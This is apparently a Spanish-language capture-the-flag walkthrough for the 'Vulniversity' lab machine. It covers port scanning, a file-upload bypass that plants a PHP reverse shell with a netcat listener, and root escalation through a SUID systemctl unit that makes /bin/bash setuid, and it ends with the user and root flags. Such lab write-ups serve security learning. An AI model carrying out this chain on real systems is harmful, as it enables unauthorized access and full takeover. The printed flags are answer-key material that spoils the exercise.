# Vulniversity by Javier 'Glyaxz' Garcia

ip = 10.10.251.2

# Procedemos a escanear la maquina en busca de puertos y encontramos esto:

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

# Buscaremos carpetas dentro de la pagina web

gobuster -u http://10.10.251.2:3333/ -w /opt/wordlist/webdir/directory-list-lowercase-2.3-medium.txt 

# Encontraremos una carpeta llamada Uploads/ en la cual podremos subir ficheros
# Aprovecharemos esto para insertar una Reverse Shell y asi poder acceder a la bash

# Usaremos el PHP_reverse_shell de pentest monkey.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

# Cambiaremos el nombre del fichero por shell.phtml y lo subiremos al panel.
# Con el subido, vamos a dirigirnos a /uploads donde tendria que estar

# Vamos a crear un Listener con NC en el puerto 4444

nc -lvnp 4444

# Podemos investigar la maquina, buscando en las carpetas personales, donde encontraremos una carpeta personal la cual tenemos permisos de lectura

# Escanearemos la maquina en busca de ficheros binarios que pueda ejecutar el root.
# Usaremos el siguiente comando

find / -user root -perm -4000 -exec ls -ldb {} \;

# Encontraremos que podemos usar como via de entrada el fichero /bin/systemctl
# Vamos a aprovechar para escalar privilegios usando la SUID de systemctl.
# Nos ayudaremos de la siguente pagina.

https://gtfobins.github.io/gtfobins/systemctl/#suid

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

# Con este script vamos a darle el permiso de binario a la shell
# https://i.imgur.com/ZhaNR2p.jpg

# Para poder ejecutar comandos con permisos de root, vamos a ejecutar el siguiente comando
bash -p


user.txt = 8bd7992fbe8a6ad22a63361004cfcedb
root.txt = a58ff8579f0a9270368d33a9966c7fd5

